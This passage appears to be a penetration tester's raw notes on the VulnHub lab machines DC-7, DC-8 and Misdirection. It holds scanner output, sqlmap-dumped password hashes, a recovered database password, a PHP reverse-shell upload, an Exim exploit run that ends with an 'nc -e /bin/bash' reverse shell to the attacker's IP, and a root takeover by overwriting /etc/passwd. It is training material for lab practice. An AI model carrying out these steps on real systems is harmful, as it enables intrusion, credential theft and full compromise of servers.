9KB - /admin/<br />[17:13:17] 200 -    8KB - /node/<br />[17:13:20] 302 -  376B  - /Search/  -&gt;  <a href="http://192.168.11.134/search/node">http://192.168.11.134/search/node</a><br />[17:13:20] 403 -  295B  - /sites/<br />[17:13:26] 403 -  294B  - /core/<br />[17:13:27] 301 -  326B  - /install.php  -&gt;  <a href="http://192.168.11.134/core/install.php">http://192.168.11.134/core/install.php</a><br />[17:13:30] 403 -  298B  - /profiles/<br />[17:13:33] 403 -  157B  - /update.php<br />[17:13:57] 403 -  296B  - /vendor/<br />[17:17:09] 302 -  372B  - /User/  -&gt;  <a href="http://192.168.11.134/user/login">http://192.168.11.134/user/login</a><br />[17:17:39] 403 -    9KB - /Admin/<br />[17:17:51] 403 -  298B  - /Template/<br />[17:27:12] 403 -    9KB - /batch/<br />[17:27:41] 302 -  376B  - /SEARCH/  -&gt;  <a href="http://192.168.11.134/search/node">http://192.168.11.134/search/node</a><br />[17:27:46] 403 -  300B  - /Repository/<br />[17:28:15] 301 -  326B  - /rebuild.php  -&gt;  <a href="http://192.168.11.134/core/rebuild.php">http://192.168.11.134/core/rebuild.php</a><br />[17:28:54] 403 -    3KB - /Update.php<br />[17:45:18] 403 -  293B  - /Tag/<br />CTRL+C detected: Pausing threads, please wait...<br />[e]xit / [c]ontinue: e<br /><br />Canceled by the user<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-7# nikto -host <a href="http://192.168.11.134:80">http://192.168.11.134:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.134<br />+ Target Hostname:    192.168.11.134<br />+ Target Port:        80<br />+ Start Time:         2019-10-09 17:13:04 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.25 (Debian)<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;link&#39; found, with multiple values: (&lt;<a href="http://192.168.11.134/node/1>;">http://192.168.11.134/node/1&gt;;</a> rel=&quot;canonical&quot;,&lt;<a href="http://192.168.11.134/node/1>;">http://192.168.11.134/node/1&gt;;</a> rel=&quot;shortlink&quot;,&lt;<a href="http://192.168.11.134/node/1>;">http://192.168.11.134/node/1&gt;;</a> rel=&quot;revision&quot;,)<br />+ Uncommon header &#39;x-generator&#39; found, with contents: Drupal 8 (<a href="https://www.drupal.org)">https://www.drupal.org)</a><br />+ Uncommon header &#39;x-drupal-dynamic-cache&#39; found, with contents: MISS<br />+ Uncommon header &#39;x-drupal-cache&#39; found, with contents: HIT<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Entry &#39;/README.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/filter/tips/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/search/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (302)<br />+ Entry &#39;/user/password/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/user/login/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/index.php/filter/tips&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/index.php/search/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (302)<br />+ Entry &#39;/index.php/user/password/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/index.php/user/login/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 40 entries which should be manually viewed.<br />+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, POST <br />+ OSVDB-3092: /web.config: ASP config file is accessible.<br />+ OSVDB-3092: /INSTALL.txt: Default file found.<br />+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br /><br /></div><div class='page'><h1 class='title level-6'>drupwn</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-7# drupwn enum <a href="http://192.168.11.134">http://192.168.11.134</a><br /><br />        ____<br />       / __ \_______  ______ _      ______<br />      / / / / ___/ / / / __ \ | /| / / __ \<br />     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /<br />    /_____/_/   \__,_/ .___/|__/|__/_/ /_/<br />                     /_/<br />    <br />[-] Version not specified, trying to identify it<br /><br />[+] Version detected: 8.0<br /><br /><br />============ Nodes ============<br /><br /><a href="http://192.168.11.134/node/2">http://192.168.11.134/node/2</a><br /><a href="http://192.168.11.134/node/1">http://192.168.11.134/node/1</a><br /><a href="http://192.168.11.134/node/3">http://192.168.11.134/node/3</a><br /><br />============ Default files ============<br /><br />[+] /README.txt (200)<br />[+] /web.config (200)<br />[+] /LICENSE.txt (200)<br />[+] /robots.txt (200)<br />[+] /update.php (403)<br />[+] /install.php (200)<br /><br />============ Modules ============<br /><br /><br />============ Users ============<br /><br />[+] ***** (id=1)<br />[+] ***** (id=2)<br /><br />============ Themes ============<br /><br /></div><div class='page'><h1 class='title level-6'>cewl</h1><br/></div><div class='page'><h1 class='title level-5'>flag</h1><br/>root@dc-7:~# cat theflag.txt<br />cat theflag.txt<br /><br /><br /><br /><br />888       888          888 888      8888888b.                             888 888 888 888 <br />888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 <br />888  d8b  888          888 888      888    888                            888 888 888 888 <br />888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 <br />888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 <br />88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P <br />8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  <br />888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 <br /><br /><br />Congratulations!!!<br /><br />Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those<br />who have provided feedback, and all those who have taken the time to complete these little<br />challenges.<br /><br />I&#39;m sending out an especially big thanks to:<br /><br />@4nqr34z<br />@D4mianWayne<br />@0xmzfr<br />@theart42<br /><br />If you enjoyed this CTF, send me a tweet via @DCAU7.<br /></div><div class='page'><h1 class='title level-4'>DC-8</h1><br/>normal nmap and found that 22 and 80 were open <br />dirsearch, nikto, found that it was drupal 7<br />ran drupwn and found nothing exciting<br />after clicking around (and then cheating) I found that the url 192.168.11.135/?nid=2&#39; would give a sql error<br />I ran sqlmap against this and then another more specific for the uses table and got hashes for admin and john<br />I then ran the hashes against john and got the password turtle for john!<br /><br />from there I was able to log into the website and make a php file!<br />login&gt;content&gt;edit&gt;webform&gt;formsettings&gt;<br />paste php script form pentestmonkey !!!AND BE SURE TO PUT SOME REAL TEXT OUTSIDE OF THE PHP CODE OR IT WILL NOT BE RUN!!!!<br />set text format to phpcode&gt; save<br /><br />now lets execute<br />start listener<br />logout&gt;contact us&gt;bullshit&gt;submit<br />enjoy your shell!!<br /><br />Now I run lse.sh and find that the machine is running exim4<br />exim4 --version shows version 4.87<br />exploitdb takes us to <a href="https://www.exploit-db.com/exploits/46996">https://www.exploit-db.com/exploits/46996</a><br />run dos2unix against the code to “unwindowsify” it<br />put 46996.sh on target box<br /><br />start nc listener<br />/bin/bash 46996.sh -m netcat<br />it will say to wait 5 seconds... and then you get to put in a command<br />you put in nc -e /bin/bash 192.168.11.136 3234          (that is your kali IP)<br />and boom!! root shell!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>nmap -sC -sV -p- -oN DC-8.txt 192.168.11.135   <br /><br /><a href="http://192.168.11.135/node/3/done?sid=1&token=07f0b779b2d2e1eb35df9d327f06d9d5">http://192.168.11.135/node/3/done?sid=1&amp;token=07f0b779b2d2e1eb35df9d327f06d9d5</a><br /><br />sqlmap -u &quot;<a href="http://192.168.11.130/thankyou.php?firstname=chris&lastname=larry&country=australia&subject=whoami"">http://192.168.11.135/?nid=2;&quot;</a> --risk=3 --level=5<br /><br />john turtle<br /><br />*/<br />$databases = array (<br />  &#39;default&#39; =&gt; <br />  array (<br />    &#39;default&#39; =&gt; <br />    array (<br />      &#39;database&#39; =&gt; &#39;d7db&#39;,<br />      &#39;username&#39; =&gt; &#39;dbuser&#39;,<br />      &#39;password&#39; =&gt; &#39;4nB90JumP&#39;,<br />      &#39;host&#39; =&gt; &#39;localhost&#39;,<br />      &#39;port&#39; =&gt; &#39;&#39;,<br />      &#39;driver&#39; =&gt; &#39;mysql&#39;,<br />      &#39;prefix&#39; =&gt; &#39;&#39;,<br />    ),<br />  ),<br /><br />^m or ^M in your script? use dos2unix</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-8# nmap -sC -sV -p- -oN DC-8.txt 192.168.11.135   <br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-10 12:26 EDT<br />Nmap scan report for 192.168.11.135<br />Host is up (0.00054s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)<br />|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)<br />|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)<br />80/tcp open  http    Apache httpd<br />|_http-generator: Drupal 7 (<a href="http://drupal.org)">http://drupal.org)</a><br />| http-robots.txt: 36 disallowed entries (15 shown)<br />| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br />| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br />| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br />|_/LICENSE.txt /MAINTAINERS.txt<br />|_http-server-header: Apache<br />|_http-title: Welcome to DC-8 | DC-8<br />MAC Address: 00:0C:29:F5:C1:50 (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-8# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.135">http://192.168.11.135</a> <br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-10_12-28-46.log<br /><br />Target: <a href="http://192.168.11.135">http://192.168.11.135</a><br /><br />[12:28:46] Starting: <br />[12:28:46] 403 -  213B  - /.php<br />[12:28:46] 200 -    8KB - /index.php<br />[12:28:46] 403 -    7KB - /search/<br />[12:28:47] 403 -  215B  - /icons/<br />[12:28:47] 403 -  214B  - /misc/<br />[12:28:47] 403 -  216B  - /themes/<br />[12:28:47] 200 -    8KB - /0/<br />[12:28:47] 200 -    8KB - /user/<br />[12:28:47] 403 -  217B  - /modules/<br />[12:28:48] 403 -    7KB - /admin/<br />[12:28:48] 403 -  217B  - /scripts/<br />[12:28:49] 200 -    7KB - /node/<br />[12:28:51] 403 -    7KB - /Search/<br />[12:28:51] 403 -  215B  - /sites/<br />[12:28:52] 403 -  218B  - /includes/<br />[12:28:53] 200 -    3KB - /install.php<br />[12:28:53] 403 -  218B  - /profiles/<br />[12:28:53] 403 -    4KB - /update.php<br />[12:29:07] 403 -    7KB - /cron.php<br />[12:29:32] 200 -    8KB - /User/<br />[12:29:39] 403 -    7KB - /Admin/<br />[12:29:42] 403 -  218B  - /Template/<br />[12:31:20] 200 -   42B  - /xmlrpc.php<br />[12:31:44] 403 -    7KB - /batch/<br />[12:31:50] 403 -    7KB - /SEARCH/<br />[12:31:52] 403 -  220B  - /Repository/<br />[12:35:24] 403 -  213B  - /Tag/<br />[12:42:43] 403 -  223B  - /server-status/<br />[12:45:00] 200 -    7KB - /Node/<br />[12:57:45] 403 -    3KB - /authorize.php<br /><br />Task Completed<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>root@kali:~/Desktop/Machines/VulnHub/DC-8# nikto -host <a href="http://192.168.11.135:80">http://192.168.11.135:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.135<br />+ Target Hostname:    192.168.11.135<br />+ Target Port:        80<br />+ Start Time:         2019-10-10 12:29:14 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ Uncommon header &#39;x-generator&#39; found, with contents: Drupal 7 (<a href="http://drupal.org)">http://drupal.org)</a><br />+ Uncommon header &#39;link&#39; found, with contents: &lt;/node/1&gt;; rel=&quot;canonical&quot;,&lt;/node/1&gt;; rel=&quot;shortlink&quot;<br />+ Entry &#39;/INSTALL.mysql.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/INSTALL.pgsql.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/INSTALL.sqlite.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/install.php&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/LICENSE.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/MAINTAINERS.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/UPGRADE.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/xmlrpc.php&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/filter/tips/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/user/password/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/user/login/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=filter/tips/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/password/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/?q=user/login/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 68 entries which should be manually viewed.<br />+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />+ DEBUG HTTP verb may show server debugging information. See <a href="http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx">http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx</a> for details.<br />+ /: A database error may reveal internal details about the running database.<br />+ OSVDB-3092: /web.config: ASP config file is accessible.<br />+ OSVDB-3092: /user/: This might be interesting...<br />+ OSVDB-3092: /UPGRADE.txt: Default file found.<br />+ OSVDB-3092: /install.php: Drupal install.php file found.<br />+ OSVDB-3092: /install.php: install.php file found.<br />+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.<br />+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.<br />+ OSVDB-3233: /INSTALL.mysql.txt: Drupal installation file found.<br />+ OSVDB-3233: /INSTALL.pgsql.txt: Drupal installation file found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8794 requests: 0 error(s) and 31 item(s) reported on remote host<br />+ End Time:           2019-10-10 12:41:28 (GMT-4) (734 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>sqlmap</h1><br/>Database: d7db                                                                                                                                                                          <br />Table: users<br />[3 entries]<br />+-----+---------+---------------------+---------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+--------+---------+------------+--------------------+-----------+------------+------------------+<br />| uid | name    | init                | pass                                                    | mail                  | data                                                                                                                                                                        | theme   | login      | access     | status | picture | created    | timezone           | signature | language   | signature_format |<br />+-----+---------+---------------------+---------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+--------+---------+------------+--------------------+-----------+------------+------------------+<br />| 0   | &lt;blank&gt; | &lt;blank&gt;             | &lt;blank&gt;                                                 | &lt;blank&gt;               | NULL                                                                                                                                                                        | &lt;blank&gt; | 0          | 0          | 0      | 0       | 0          | NULL               | &lt;blank&gt;   | &lt;blank&gt;    | NULL             |<br />| 1   | admin   | dc8blah@dc8blah.org | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z | dcau-user@outlook.com | a:2:{s:7:&quot;contact&quot;;i:0;s:7:&quot;overlay&quot;;i:1;}                                                                                                                                  | &lt;blank&gt; | 1567766626 | 1567766818 | 1      | 0       | 1567489015 | Australia/Brisbane | &lt;blank&gt;   | &lt;blank&gt;    | filtered_html    |<br />| 2   | john    | john@blahsdfsfd.org | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF | john@blahsdfsfd.org   | a:5:{s:16:&quot;ckeditor_default&quot;;s:1:&quot;t&quot;;s:20:&quot;ckeditor_show_toggle&quot;;s:1:&quot;t&quot;;s:14:&quot;ckeditor_width&quot;;s:4:&quot;100%&quot;;s:13:&quot;ckeditor_lang&quot;;s:2:&quot;en&quot;;s:18:&quot;ckeditor_auto_lang&quot;;s:1:&quot;t&quot;;} | &lt;blank&gt; | 1567497783 | 1567498512 | 1      | 0       | 1567489250 | Australia/Brisbane | &lt;blank&gt;   | &lt;blank&gt;    | filtered_html    |<br />+-----+---------+---------------------+---------------------------------------------------------+-----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+--------+---------+------------+--------------------+-----------+------------+------------------+<br /></div><div class='page'><h1 class='title level-5'>flag</h1><br/>cat flag.txt<br /><br /><br /><br />Brilliant - you have succeeded!!!<br /><br /><br /><br />888       888          888 888      8888888b.                             888 888 888 888<br />888   o   888          888 888      888  &quot;Y88b                            888 888 888 888<br />888  d8b  888          888 888      888    888                            888 888 888 888<br />888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888<br />888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888<br />88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P<br />8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;<br />888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888<br /><br /><br /><br />Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those<br />who have provided feedback, and all those who have taken the time to complete these little<br />challenges.<br /><br />I&#39;m also sending out an especially big thanks to:<br /><br />@4nqr34z<br />@D4mianWayne<br />@0xmzfr<br />@theart42<br /><br />This challenge was largely based on two things:<br /><br />1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.<br />2. A suggestion from @theart42<br /><br />The answer to that question is...<br /><br />If you enjoyed this CTF, send me a tweet via @DCAU7.<br /></div><div class='page'><h1 class='title level-3'>Misdirection</h1><br/>ran normal namp scan and found port 80, 8080, 22, and 3306<br />ran dirsearch and nikto<br />dirsearch foung that on 8080 there was a url /debug/ that gave an interactive shell<br />the shell was super f&#39;d ( I could not execute certain commands due to this limitation)<br />went to msf and used exploit/multi/script/web_delivery<br />NEW SHELL (you will get kicked out and have to go in to session 2) as www-data<br /><br />from here sudo -l revealed that I could sudo  /bin/bash as brexit<br />lse.sh revealed that I could write to /etc/passwd!<br />openssl passwd -1 coolhand<br />$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40<br />vi /etc/passwd<br />root:$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40:0:0:root:/root:/bin/bash<br />:wq!<br />su<br />coolhand<br />YEEEEEEEEET!!!!!!!!! rooted!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />??stuck in debug??                        <br />msfconsole<br />use exploit/multi/script/web_delivery    <br />!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!<br />^^^^^^^^^^^^^^^^^^^^<br />give raj his due and a lookup when doing the writeup!!</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>nmap -sC -sV -p- -oN Misdirection.txt 192.168.11.137                                                                  &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /><br />python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.137:80">http://192.168.11.137:80</a><br /><br />python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.137:8080">http://192.168.11.137:8080</a><br /><br />nikto -host <a href="http://192.168.11.137:80">http://192.168.11.137:80</a><br /><br />nikto -host <a href="http://192.168.11.137:8080">http://192.168.11.137:8080</a><br /><br />wpscan --url <a href="http://10.10.10.37">http://</a>192.168.11.137:80 --enumerate u,ap,tt,t --passwords /root/Desktop/Tools/Wordlists/rockyou.txt -e | tee WPScanBruteForce.txt<br /><br />:8080/debug/<br /><a href="https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/">https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/</a></div><div class='page'><h1 class='title level-5'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/Misdirection# nmap -sC -sV -p- -oN Misdirection.txt 192.168.11.137<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-10 17:59 EDT<br />Nmap scan report for 192.168.11.137<br />Host is up (0.00028s latency).<br />Not shown: 65531 closed ports<br />PORT     STATE SERVICE VERSION<br />22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)<br />|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)<br />|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)<br />80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)<br />|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).<br />3306/tcp open  mysql   MySQL (unauthorized)<br />8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br />|_http-open-proxy: Proxy might be redirecting requests<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: Apache2 Ubuntu Default Page: It works<br />MAC Address: 00:0C:29:69:F3:AD (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 25.09 seconds<br /></div><div class='page'><h1 class='title level-5'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-6'>80</h1><br/>root@kali:~/Desktop/Machines/VulnHub/Misdirection# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.137:80">http://192.168.11.137:80</a><br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-10_18-03-29.log<br /><br />Target: <a href="http://192.168.11.137:80">http://192.168.11.137:80</a><br /><br />[18:03:30] Starting: <br />[18:03:30] 400 -   50B  - /cgi-bin/<br />[18:03:30] 400 -   50B  - /wp-content/<br />[18:03:31] 200 -   42B  - /admin/<br />[18:03:31] 200 -   13KB - /welcome/<br />[18:03:31] 400 -   50B  - /wp-login/<br />[18:03:32] 400 -   50B  - /used-cars/<br />[18:03:32] 400 -   50B  - /privacy-policy/<br />[18:03:32] 400 -   50B  - /contact-us/<br />[18:03:33] 400 -   50B  - /wp-includes/<br />[18:03:33] 400 -   50B  - /site-map/<br />[18:03:33] 200 -    7KB - /examples/<br />[18:03:58] 400 -   50B  - /german-cars/<br />[18:04:03] 400 -   50B  - /american-cars/<br />[18:04:08] 400 -   50B  - /ferrari-dino/<br />[18:04:08] 400 -   50B  - /italian-cars/<br />[18:04:08] 400 -   50B  - /french-cars/<br />[18:04:13] 400 -   50B  - /japan-cars/<br />[18:04:13] 400 -   50B  - /moto-news/<br />[18:04:13] 400 -   50B  - /wp-register/<br />[18:04:48] 502 -  483B  - /M_images.php<br />[18:04:53] 400 -   50B  - /ubuntu-6/<br />[18:05:03] 400 -   50B  - /-/<br />[18:05:13] 400 -   50B  - /about-us/<br />[18:05:43] 400 -   50B  - /valid-xhtml10/<br />[18:06:58] 400 -   50B  - /wp-rss2/<br />[18:08:33] 400 -   50B  - /468x60-1/<br />[18:10:33] 400 -   50B  - /valid-html401/<br />CTRL+C detected: Pausing threads, please wait...<br /><br />Canceled by the user<br />root@kali:~/Desktop/Machines/VulnHub/Misdirection# <br /></div><div class='page'><h1 class='title level-6'>8080</h1><br/>root@kali:~/Desktop/Machines/VulnHub/Misdirection# python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://192.168.11.137:8080">http://192.168.11.137:8080</a><br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-10_18-03-18.log<br /><br />Target: <a href="http://192.168.11.137:8080">http://192.168.11.137:8080</a><br /><br />[18:03:18] Starting: <br />[18:03:19] 403 -  295B  - /.php<br />[18:03:19] 200 -  745B  - /images/<br />[18:03:19] 200 -  741B  - /help/<br />[18:03:19] 403 -  297B  - /icons/<br />[18:03:19] 200 -  747B  - /scripts/<br />[18:03:20] 200 -  739B  - /css/<br />[18:03:20] 200 -  755B  - /development/<br />[18:03:20] 200 -  745B  - /manual/<br />[18:03:21] 200 -  737B  - /js/<br />[18:03:21] 200 -   11KB - /wordpress/<br />[18:03:23] 200 -  743B  - /shell/<br />[18:03:32] 200 -   13KB - /debug/<br />[18:06:55] 403 -  305B  - /server-status/<br /><br />Task Completed<br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/></div><div class='page'><h1 class='title level-6'>80</h1><br/>root@kali:~/Desktop/Machines/VulnHub/Misdirection# nikto -host <a href="http://192.168.11.137:80">http://192.168.11.137:80</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.137<br />+ Target Hostname:    192.168.11.137<br />+ Target Port:        80<br />+ Start Time:         2019-10-10 18:05:08 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Rocket 1.2.6 Python/2.7.15rc1<br />+ Retrieved x-powered-by header: web2py<br />+ RFC-1918 IP address found in the &#39;set-cookie&#39; header. The IP is &quot;192.168.11.136&quot;.<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ RFC-1918 IP address found in the &#39;session_id_init&#39; cookie. The IP is &quot;192.168.11.136&quot;.<br />+ Uncommon header &#39;web2py_error&#39; found, with contents: invalid path<br />+ ERROR: Error limit (20) reached for host, giving up. Last error: <br />+ Scan terminated:  11 error(s) and 7 item(s) reported on remote host<br />+ End Time:           2019-10-10 18:10:18 (GMT-4) (310 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>8080</h1><br/>root@kali:~/Desktop/Machines/VulnHub/Misdirection# nikto -host <a href="http://192.168.11.137:8080">http://192.168.11.137:8080</a><br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.137<br />+ Target Hostname:    192.168.11.137<br />+ Target Port:        8080<br />+ Start Time:         2019-10-10 18:06:22 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.29 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ 